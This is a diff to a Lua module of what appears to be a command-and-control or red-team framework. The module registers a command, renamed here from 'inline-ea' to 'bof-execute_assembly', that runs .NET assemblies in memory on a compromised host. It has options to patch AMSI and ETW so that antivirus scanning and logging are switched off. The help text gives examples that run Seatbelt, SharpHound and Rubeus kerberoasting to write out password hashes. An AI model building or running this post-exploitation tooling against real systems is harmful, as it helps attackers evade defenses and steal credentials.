@@ -18,6 +18,27 @@ function new_sac()
     return sac
 end
 
+function has_clr_version(session, version_pattern)
+    local clr_versions = session.Os.ClrVersion
+    if clr_versions == nil then
+        return false
+    end
+
+    -- Handle protobuf repeated field (use numeric indexing)
+    local i = 1
+    while true do
+        local version = clr_versions[i]
+        if version == nil then
+            break
+        end
+        if string.find(version, version_pattern, 1, true) then
+            return true
+        end
+        i = i + 1
+    end
+    return false
+end
+
 -- inline-ea: Execute .NET assemblies with inline execution and patching capabilities
 local function run_inline_ea(args, cmd)
     if #args < 1 then 
@@ -32,10 +53,9 @@ local function run_inline_ea(args, cmd)
     local patch_amsi = cmd:Flags():GetBool("amsi")
     local patch_etw = cmd:Flags():GetBool("etw") 
     local patch_exit = cmd:Flags():GetBool("patchexit")
-    local assembly_args = cmd:Flags():GetString("args")
-    
+
     -- Handle legacy argument parsing for backward compatibility
-    local dotnet_args = {}
+    local assembly_args = {}
     for i = 2, #args do
         local arg = args[i]
         if arg == "--amsi" then
@@ -45,18 +65,18 @@ local function run_inline_ea(args, cmd)
         elseif arg == "--patchexit" then
             patch_exit = true
         else
-            table.insert(dotnet_args, arg)
+            table.insert(assembly_args, arg)
         end
     end
     
-    -- Combine flag args with positional args
-    if assembly_args ~= "" then
-        if #dotnet_args > 0 then
-            assembly_args = table.concat(dotnet_args, " ") .. " " .. assembly_args
-        end
-    else
-        assembly_args = table.concat(dotnet_args, " ")
-    end
+    ---- Combine flag args with positional args
+    --if assembly_args ~= "" then
+    --    if #dotnet_args > 0 then
+    --        assembly_args = table.concat(dotnet_args, " ") .. " " .. assembly_args
+    --    end
+    --else
+    --    assembly_args = table.concat(dotnet_args, " ")
+    --end
     
     -- Read assembly file
     local assembly_handle = io.open(assembly_path, "rb")
@@ -94,26 +114,26 @@ local function run_inline_ea(args, cmd)
     return bof(session, script_resource(bof_file), packed_args, true)
 end
 
-local cmd_inline_ea = command("inline-ea", run_inline_ea, 
+local cmd_inline_ea = command("bof-execute_assembly", run_inline_ea,
         "Execute .NET assemblies with inline execution and patching", "T1055")
 cmd_inline_ea:Flags():Bool("amsi", false, "Patch AMSI before execution")
 cmd_inline_ea:Flags():Bool("etw", false, "Patch ETW before execution") 
 cmd_inline_ea:Flags():Bool("patchexit", false, "Patch exit functions")
 cmd_inline_ea:Flags():String("args", "", "Arguments to pass to the assembly")
-opsec("inline-ea", 8.5)
+opsec("bof-execute_assembly", 8.5)
 
-help("inline-ea", [[
+help("bof-execute_assembly", [[
 Execute .NET assemblies with inline execution and optional patching capabilities.
 
 Examples:
-  inline-ea C:\Tools\Seatbelt.exe                                    # Basic execution
-  inline-ea C:\Tools\Seatbelt.exe --amsi --etw                       # With AMSI and ETW patching
-  inline-ea C:\Tools\Rubeus.exe --args "kerberoast /outfile:hashes"  # With arguments
-  inline-ea C:\Tools\SharpHound.exe --patchexit                      # With exit patching
+  bof-execute_assembly C:\Tools\Seatbelt.exe                                    # Basic execution
+  bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw                       # With AMSI and ETW patching
+  bof-execute_assembly C:\Tools\Rubeus.exe --args "kerberoast /outfile:hashes"  # With arguments
+  bof-execute_assembly C:\Tools\SharpHound.exe --patchexit                      # With exit patching
 
 Legacy positional format (still supported):
-  inline-ea C:\Tools\Seatbelt.exe --amsi --etw AntiVirus
-  inline-ea C:\Tools\Rubeus.exe kerberoast /outfile:hashes --amsi
+  bof-execute_assembly C:\Tools\Seatbelt.exe --amsi --etw AntiVirus
+  bof-execute_assembly C:\Tools\Rubeus.exe kerberoast /outfile:hashes --amsi
 
 Options:
   --amsi: Patch AMSI (Anti-Malware Scan Interface) before execution
